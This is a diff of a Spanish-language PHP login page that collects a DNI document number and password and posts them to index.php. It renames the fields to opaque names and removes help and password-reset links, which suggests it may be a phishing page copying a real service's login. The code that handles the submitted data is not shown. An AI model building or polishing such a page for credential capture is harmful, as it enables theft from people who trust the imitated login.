@@ -30,7 +30,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     exit;
 }
 ?>
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -89,7 +88,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     form { margin: 0; }
 
-    /* === Campo Documento === */
     .field-group { margin-bottom: 26px; }
     .top-row {
         display: flex;
@@ -161,7 +159,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         border-bottom: 2px solid var(--accent);
     }
 
-    /* === Contraseña === */
     .pw-label {
         font-size: 14px;
         color: #b0b0b0;
@@ -211,13 +208,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         cursor: pointer;
     }
 
-    /* === Botón === */
     .btn {
         width: 50%;
         height: 40px;
         background: var(--btn-light);
         color: white;
-        padding: 0;
         border: none;
         border-radius: 4px;
         font-size: 18px;
@@ -232,65 +227,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         cursor: pointer;
         opacity: 1;
     }
-
-    .btn.btn-active:active {
-        transform: translateY(1px);
-        box-shadow: 0 3px 8px rgba(0,0,0,0.25);
-    }
-
-    .bottom-bar {
-        width: 420px;
-        background: linear-gradient(to right, #1c7254, #054d63);
-        color: white;
-        font-size: 14px;
-        padding: 12px 18px;
-        border-radius: 0 0 40px 40px;
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        display: flex;
-        gap: 20px;
-    }
-
-    .bottom-bar a {
-        color: white;
-        text-decoration: none;
-    }
-
-    /* ===== Mobile ===== */
-    @media (max-width: 768px) {
-        body {
-            background: var(--bg-mobile) no-repeat center center;
-            background-size: cover;
-            flex-direction: column;
-            justify-content: flex-start;
-            align-items: center;
-            padding-top: 20px;
-        }
-
-        .bluee-img {
-            position: relative;
-            width: 200px;
-            top: 0;
-            right: auto;
-            margin-bottom: 10px;
-        }
-
-        .card {
-            width: 90%;
-            max-width: 420px;
-            margin-left: 0;
-            padding: 28px 22px 56px;
-        }
-
-        .bottom-bar {
-            width: 100%;
-            border-radius: 0 0 32px 32px;
-            padding: 12px 22px;
-            font-size: 13px;
-            gap: 14px;
-        }
-    }
 </style>
 </head>
 <body>
@@ -300,9 +236,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <div class="card">
     <form action="index.php" method="POST">
 
-        <!-- Documento -->
         <div class="field-group">
             <div class="top-row">
+
                 <div class="select-wrap">
                     <select name="tipo_doc">
                         <option value="dni">DNI</option>
@@ -312,26 +248,25 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 </div>
 
                 <div class="input-wrap">
-                    <input  id="ips1" name="ips1"
+                    <input
+                        id="ips1"
+                        name="ips1"
                         type="tel"
-                        id="docNumber"
-                        name="numero_documento"
                         inputmode="numeric"
                         pattern="[0-9]*"
                         placeholder=" "
                     >
-                    <label for="docNumber" class="floating-label">Número de documento</label>
+                    <label for="ips1" class="floating-label">Número de documento</label>
                 </div>
             </div>
         </div>
 
-        <!-- Contraseña -->
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
-            <input  id="ips2" name="ips2" type="password" >
+            <input id="ips2" name="ips2" type="password">
             <div class="eye" id="togglePassword">
-                <img src="img/eye-open.png" alt="Mostrar contraseña">
+                <img src="img/eye-open.png" alt="">
             </div>
         </div>
 
@@ -345,50 +280,42 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         </center>
 
     </form>
-
-    <div class="bottom-bar">
-        <a href="#">Regístrate</a> |
-        <a href="#">Olvidé mi contraseña</a> |
-        <a href="#">Ayuda</a>
-    </div>
 </div>
 
 <script>
-    /* === Mostrar / Ocultar Contraseña === */
+    /* === Mostrar/Ocultar Contraseña === */
     const passwordInput = document.getElementById('ips2');
     const toggle = document.getElementById('togglePassword');
     const eyeImg = toggle.querySelector('img');
 
-    const eyeOpenSrc = 'img/eye-open.png';
-    const eyeClosedSrc = 'img/eye-closed.png';
+    const eyeOpen = "img/eye-open.png";
+    const eyeClosed = "img/eye-closed.png";
 
-    toggle.addEventListener('click', () => {
-        const isHidden = passwordInput.type === 'ips2';
-        passwordInput.type = isHidden ? 'text' : 'ips2';
-        eyeImg.src = isHidden ? eyeClosedSrc : eyeOpenSrc;
+    toggle.addEventListener("click", () => {
+        const hidden = passwordInput.type === "password";
+        passwordInput.type = hidden ? "text" : "password";
+        eyeImg.src = hidden ? eyeClosed : eyeOpen;
     });
 
-    /* === Activación del botón === */
-    const docInput = document.getElementById('docNumber');
-    const submitBtn = document.getElementById('submitBtn');
+    /* === Activar botón cuando ips1 y ips2 >= 4 === */
+    const docInput = document.getElementById("ips1");
+    const submitBtn = document.getElementById("submitBtn");
 
-    function sanitizeAndValidate() {
-        docInput.value = docInput.value.replace(/\D/g, '');
+    function validate() {
+        const docOK = docInput.value.length >= 4;
+        const passOK = passwordInput.value.length >= 4;
 
-        const hasDoc = docInput.value.length >= 4;
-        const hasPwd = passwordInput.value.length >= 4;
-
-        if (hasDoc && hasPwd) {
+        if (docOK && passOK) {
             submitBtn.disabled = false;
-            submitBtn.classList.add('btn-active');
+            submitBtn.classList.add("btn-active");
         } else {
             submitBtn.disabled = true;
-            submitBtn.classList.remove('btn-active');
+            submitBtn.classList.remove("btn-active");
         }
     }
 
-    docInput.addEventListener('input', sanitizeAndValidate);
-    passwordInput.addEventListener('input', sanitizeAndValidate);
+    docInput.addEventListener("input", validate);
+    passwordInput.addEventListener("input", validate);
 </script>
 
 </body>
